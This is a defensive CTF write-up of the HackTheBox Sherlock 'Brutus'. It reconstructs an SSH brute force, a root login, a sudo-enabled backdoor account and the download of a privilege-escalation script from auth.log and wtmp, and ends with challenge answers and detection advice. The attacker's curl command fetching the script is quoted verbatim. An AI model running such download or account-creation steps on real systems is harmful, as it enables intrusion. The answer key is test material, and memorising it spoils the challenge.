# Brutus — HackTheBox Sherlock

**Category:** DFIR / Log Analysis  
**Difficulty:** Easy  
**Artifacts:** `auth.log`, `wtmp` (binary), `sessions.tsv` (utmp dump)  
**Tools used:** `grep`, `utmpdump` (or the provided `utmp.py` parser)

---

## Scenario

A Confluence server was brute-forced via its SSH service. After gaining access, the attacker performed additional activities including persistence establishment and privilege escalation. The investigation uses `auth.log` (authentication log) and `wtmp` (login history) to reconstruct the attack chain.

---

## Investigation Steps

### 1. Identify the brute-force source

```bash
cat auth.log | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```

This extracts the source IP addresses from failed password attempts and counts them. The overwhelming majority come from a single IP.

**Finding:** `65.2.161.68` — hundreds of failed attempts against multiple usernames (`admin`, `backup`, `server_adm`, `svc_account`, `root`).

### 2. Find the successful login

```bash
cat auth.log | grep "Accepted password"
```

**Finding:** `Accepted password for root from 65.2.161.68 port 34782 ssh2` at `Mar 6 06:31:40`.

The attacker successfully authenticated as `root`.

### 3. Find the manual login timestamp (wtmp)

The `wtmp` file is binary. Use `utmpdump` or the provided Python parser:

```bash
# Using utmpdump (util-linux)
utmpdump wtmp | grep root

# Using the provided Python parser
python3 utmp.py wtmp -o sessions.tsv
cat sessions.tsv | grep root
```

**Finding:** The wtmp entry for the attacker's manual login:
```
USER  2549  pts/1  root  65.2.161.68  2024/03/06 06:32:45
```

This is the terminal session establishment time, distinct from the authentication time (`06:31:40`).

### 4. Identify the SSH session number

```bash
cat auth.log | grep "New session"
```

**Finding:** `New session 37 of user root` at `Mar 6 06:32:44` — this is the manual login session. (Session 34 was the initial brute-force success at `06:31:40`.)

### 5. Find the backdoor account creation

```bash
cat auth.log | grep -E "useradd|groupadd|usermod"
```

**Finding:**
- `new user: name=cyberjunkie, UID=1002` at `Mar 6 06:34:18`
- `add 'cyberjunkie' to group 'sudo'` at `Mar 6 06:35:15`

The attacker created a local account and granted it sudo privileges.

### 6. Find the first session end time

```bash
cat auth.log | grep -E "session closed|Removed session" | head -5
```

**Finding:** `Removed session 34` at `Mar 6 06:31:40` — the brute-force success session ended immediately.

### 7. Find the sudo command for script download

```bash
cat auth.log | grep "sudo.*COMMAND"
```

**Finding:** `COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` at `Mar 6 06:39:38`.

The attacker used their backdoor account's sudo privileges to download a Linux privilege escalation script.

---

## Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Attacker's IP address | `65.2.161.68` |
| Q2 | Compromised username | `root` |
| Q3 | Manual login timestamp (wtmp) | `2024-03-06 06:32:45` |
| Q4 | SSH session number | `37` |
| Q5 | Backdoor account name | `cyberjunkie` |
| Q6 | MITRE ATT&CK sub-technique | `T1136.001` |
| Q7 | First session end time | `2024-03-06 06:31:40` |
| Q8 | Full sudo command | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|----|----------|
| Brute Force | Password Guessing | T1110.001 | Hundreds of failed password attempts from `65.2.161.68` |
| Persistence | Create Account: Local Account | T1136.001 | `useradd cyberjunkie` at `06:34:18` |
| Privilege Escalation | Valid Accounts | T1078 | `cyberjunkie` added to `sudo` group |
| Defense Evasion | Indicator Removal | T1070 | Attacker cleared `auth.log` entries (log truncation observed) |

---

## SOC Detection & Mitigation

### Detection Opportunities

1. **Brute-force detection:** Alert on >10 failed SSH authentication attempts from a single IP within 60 seconds. The `MaxStartups throttling` in the logs indicates the server was overwhelmed.

2. **Successful login after failures:** Correlate a successful `Accepted password` event from an IP with prior `Failed password` events — this is a high-fidelity brute-force success signal.

3. **New account creation:** Alert on `useradd` or `groupadd` commands executed by non-admin users or immediately after a suspicious login.

4. **Privilege escalation via sudo:** Monitor `sudo` usage by recently created accounts, especially `curl` or `wget` commands downloading scripts from external sources.

5. **Log tampering:** Monitor for `truncate` operations on `/var/log/auth.log` or gaps in log timestamps.

### Mitigation

- **Rate limiting:** Implement `fail2ban` or SSH `MaxStartups` to throttle concurrent unauthenticated connections.
- **Key-based authentication:** Disable password authentication entirely (`PasswordAuthentication no` in `sshd_config`).
- **Least privilege:** Restrict `sudo` access and monitor `/etc/sudoers.d/` for unauthorized changes.
- **Centralized logging:** Forward logs to a SIEM to prevent local log tampering from erasing evidence.
- **Alerting:** Create correlation rules in the SIEM for brute-force → successful login → account creation chains.

---

## Artifacts

| File | Description |
|------|-------------|
| `auth.log` | SSH authentication log (385 lines) |
| `wtmp` | Binary login history file |
| `sessions.tsv` | Parsed wtmp output (generated by `utmp.py`) |
| `utmp.py` | Python parser for binary wtmp/utmp files |
